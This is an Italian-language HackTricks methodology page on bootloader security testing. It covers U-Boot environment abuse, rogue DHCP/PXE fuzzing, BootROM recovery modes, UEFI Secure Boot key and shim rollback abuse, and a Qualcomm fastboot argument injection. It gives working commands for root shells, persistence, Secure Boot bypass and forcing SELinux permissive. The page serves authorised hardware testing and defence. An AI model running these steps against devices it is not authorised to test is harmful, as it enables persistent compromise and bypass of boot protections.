# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

I seguenti passaggi sono consigliati per modificare le configurazioni di avvio dei dispositivi e testare bootloader come U-Boot e loader di classe UEFI. Concentrarsi sull'ottenimento di code execution nelle fasi iniziali, sulla valutazione delle protezioni contro signature/rollback e sull'abuso dei percorsi di recovery o network-boot.

Related: bypass del secure-boot MediaTek tramite patching di bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Accedere alla interpreter shell
- Durante il boot, premere un tasto di interruzione noto (spesso un tasto qualsiasi, 0, spazio o una sequenza "magic" specifica della board) prima dell'esecuzione di `bootcmd` per accedere al prompt di U-Boot.<sup>[[1]](#references)</sup>

2. Ispezionare lo stato del boot e le variabili
- Comandi utili:
- `printenv` (dump dell'environment)
- `bdinfo` (informazioni sulla board, indirizzi di memoria)
- `help bootm; help booti; help bootz` (metodi di boot del kernel supportati)
- `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modificare gli argomenti di boot per ottenere una root shell
- Aggiungere `init=/bin/sh` in modo che il kernel acceda a una shell invece di eseguire l'init normale:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Eseguire il netboot dal proprio server TFTP
- Configurare la rete e recuperare un kernel/fit image dalla LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Rendere persistenti le modifiche tramite l'environment
- Se lo storage dell'environment non è protetto dalla scrittura, è possibile rendere persistente il controllo:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Controllare variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori configurati erroneamente possono consentire interruzioni ripetute verso la shell.

6. Controllare le feature di debug/non sicure
- Cercare: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` senza restrizioni, possibilità di usare `loady`/`loads` tramite seriale, `env import` da supporti non trusted e kernel/ramdisk caricati senza signature checks.

7. Test delle image e della verifica di U-Boot
- Se la piattaforma dichiara di utilizzare secure/verified boot con FIT images, provare sia image unsigned sia image manomesse:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` consentono spesso di eseguire payload arbitrari.
- Non fermarsi a un semplice risultato allow/deny: ricerche recenti su FIT hanno mostrato che lo stesso verification path può costituire una attack surface pre-auth. Eseguire negative test sui dati FIT memorizzati esternamente (`data-offset`, `data-position`, `data-size`), sulla selezione delle configurazioni firmate, su `loadables` e sulla gestione di overlay / `extra-conf`.
- Se si dispone di un source tree corrispondente, `test/vboot/vboot_test.sh` è un metodo rapido per riprodurre il comportamento della FIT verification nella sandbox di U-Boot prima di operare sull'hardware reale.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` e script bootflows
- Nelle build moderne di U-Boot, `bootcmd` è spesso solo un wrapper attorno a Standard Boot. Ciò significa che supporti writable, PXE o SPI flash possono diventare il vero trust boundary anche quando l'environment visibile sembra innocuo.
- `extlinux` bootmeth cerca `extlinux/extlinux.conf` sotto `/` e `/boot`; lo script bootmeth cerca prima `boot.scr.uimg` e poi `boot.scr`. Nel network boot, il nome dello script può provenire da `boot_script_dhcp`.
- Comandi utili per il triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Casi di abuso da testare: supporti USB/SD controllati dall'attacker in posizione precedente in `boot_targets`, `/boot/extlinux/extlinux.conf` writable, TFTP rogue che fornisce `boot.scr` o esecuzione di script supportata da SPI tramite `script_offset_f`.
- Se la piattaforma si basa sulla FIT verification, assicurarsi che le configurazioni siano firmate a livello di configurazione e non solo per singola image; `required-mode=all` è più robusto dell'accettazione di una qualsiasi singola chiave richiesta.

## Network-boot surface (DHCP/PXE) and rogue servers

9. Fuzzing dei parametri PXE/DHCP
- La gestione legacy BOOTP/DHCP di U-Boot ha presentato problemi di memory safety. Ad esempio, CVE‑2024‑42040 descrive una memory disclosure tramite risposte DHCP appositamente create, che può esporre byte dalla memoria di U-Boot trasmettendoli sulla rete.<sup>[[4]](#references)</sup> Eseguire i code path DHCP/PXE con valori eccessivamente lunghi o appartenenti a edge case (option 67 bootfile-name, vendor options, campi file/servername) e osservare eventuali hang/leak.
- Snippet Scapy minimo per sottoporre a stress i parametri di boot durante il netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Verificare inoltre se i campi del filename PXE vengono passati alla logica della shell/loader senza sanitizzazione quando concatenati a script di provisioning lato OS.

10. Test di command injection tramite rogue DHCP server
- Configurare un servizio DHCP/PXE rogue e provare a inserire caratteri nei campi filename o nelle options per raggiungere command interpreter nelle fasi successive della boot chain. L'auxiliary DHCP di Metasploit, `dnsmasq` o script Scapy personalizzati funzionano bene. Assicurarsi prima di isolare la rete di laboratorio.

## SoC ROM recovery modes that override normal boot

Molti SoC espongono una modalità "loader" BootROM che accetta codice tramite USB/UART anche quando le flash image non sono valide. Se i secure-boot fuse non sono stati bruciati, ciò può fornire arbitrary code execution molto presto nella chain.

- NXP i.MX (Serial Download Mode)
- Tool: `uuu` (mfgtools3) o `imx-usb-loader`.
- Esempio: `imx-usb-loader u-boot.imx` per inviare ed eseguire un U-Boot personalizzato dalla RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Esempio: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Esempio: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` per preparare un loader e caricare un U-Boot personalizzato.

Valutare se il dispositivo dispone di eFuse/OTP secure-boot bruciati. In caso contrario, le modalità BootROM download spesso bypassano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs), eseguendo il payload di first-stage direttamente da SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

11. Test di tampering dell'ESP, rollback e key enrollment
- Montare la EFI System Partition (ESP) e cercare i componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi dei vendor logo.
- Eseguire il dump dello stato di Secure Boot e dei key database dall'OS quando possibile:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Se la piattaforma è in Setup Mode, accetta key enrollment non autenticato o viene distribuita con un Platform Key (PKfail class) di test/default, un admin locale o un attacker con accesso fisico può registrare il proprio KEK/db e mantenere Secure Boot apparentemente “enabled” eseguendo al contempo EFI binaries arbitrarie.<sup>[[3]](#references)</sup>
- Provare il boot con boot components signed downgraded o noti come vulnerabili se le Secure Boot revocations (`dbx`) non sono aggiornate. Se la piattaforma continua a fidarsi di shim/bootmanager obsoleti, spesso è possibile caricare il proprio kernel o `grub.cfg` dall'ESP per ottenere persistence.

12. Test delle revocation stale di shim / SBAT / dbx
- Vecchi shim firmati da Microsoft e fork dei vendor possono ancora costituire un percorso bootkit in stile BYOVD se le revocation sono obsolete. In un lab isolato, posizionare uno shim storicamente vulnerabile sull'ESP e tentare di eseguire in chainload il proprio `grubx64.efi` o kernel.<sup>[[11]](#references)</sup>
- Triage rapido:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Se lo shim viene ancora eseguito nonostante sia nella revocation list, il firmware/OS dispone di aggiornamenti `dbx` obsoleti oppure si fida di un forked loader che non ha mai ereditato le protezioni SBAT upstream.

13. Bug nel parsing dei boot logo (LogoFAIL class)
- Diversi firmware OEM/IBV erano vulnerabili a flaw di image parsing in DXE che elaborano i boot logo. Se un attacker può collocare un'immagine appositamente creata sull'ESP in un percorso specifico del vendor (ad esempio `\EFI\<vendor>\logo\*.bmp`) e riavviare il dispositivo, può essere possibile ottenere code execution durante il boot iniziale anche con Secure Boot abilitato. Testare se la piattaforma accetta logo forniti dall'utente e se tali percorsi sono writable dall'OS.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Sui dispositivi Android 16 che usano ABL di Qualcomm per caricare la **Generic Bootloader Library (GBL)**, verificare se ABL **autentica** l'app UEFI caricata dalla partizione `efisp`. Se ABL controlla solo la **presenza** di un'app UEFI e non ne verifica le signature, una write primitive verso `efisp` diventa una unsigned code execution pre-OS durante il boot.<sup>[[6]](#references)[[7]](#references)</sup>

Controlli pratici e percorsi di abuso:

- **efisp write primitive**: è necessario un modo per scrivere un'app UEFI personalizzata in `efisp` (root/privileged service, bug in un'app OEM, percorso recovery/fastboot). Senza questo, il loading gap di GBL non è direttamente raggiungibile.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): alcune build accettano token aggiuntivi in `fastboot oem set-gpu-preemption` e li aggiungono alla kernel cmdline. Questo può essere usato per forzare SELinux permissive, consentendo scritture su partizioni protette:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Se il dispositivo è patchato, il comando dovrebbe rifiutare gli argomenti aggiuntivi.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock tramite persistent flags**: un payload nella fase di boot può modificare persistent unlock flags (ad esempio `is_unlocked=1`, `is_unlocked_critical=1`) per simulare `fastboot oem unlock` senza i gate di approvazione/OEM server. Si tratta di una modifica persistente della postura di sicurezza dopo il reboot successivo.<sup>[[6]](#references)</sup>

Note difensive/di triage:

- Confermare se ABL esegue la signature verification sul payload GBL/UEFI proveniente da `efisp`. In caso contrario, trattare `efisp` come una persistence surface ad alto rischio.
- Verificare se gli handler fastboot OEM di ABL sono patchati per **validare il numero di argomenti** e rifiutare token aggiuntivi.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware caution

Prestare attenzione quando si interagisce con la SPI/NAND flash durante il boot iniziale (ad esempio mettendo a massa i pin per bypassare le letture) e consultare sempre il datasheet della flash. Cortocircuiti eseguiti nel momento sbagliato possono corrompere il dispositivo o il programmer.

## Notes and additional tips

- Provare `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per spostare gli environment blob tra RAM e storage; alcune piattaforme consentono di importare l'environment da supporti rimovibili senza autenticazione.
- Per ottenere persistence sui sistemi basati su Linux che eseguono il boot tramite `extlinux.conf`, modificare la riga `APPEND` (per iniettare `init=/bin/sh` o `rd.break`) sulla boot partition è spesso sufficiente quando non vengono applicati signature checks.
- Se il target usa aggiornamenti dual-slot / A/B, esaminare le tecniche anti-rollback e slot-desync nella [firmware analysis overview](README.md) per non trascurare trust gap presenti solo nell'updater al di fuori del bootloader stesso.
- Se lo userland fornisce `fw_printenv/fw_setenv`, verificare che `/etc/fw_env.config` corrisponda al reale storage dell'environment. Offset configurati erroneamente consentono di leggere/scrivere la regione MTD sbagliata.

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
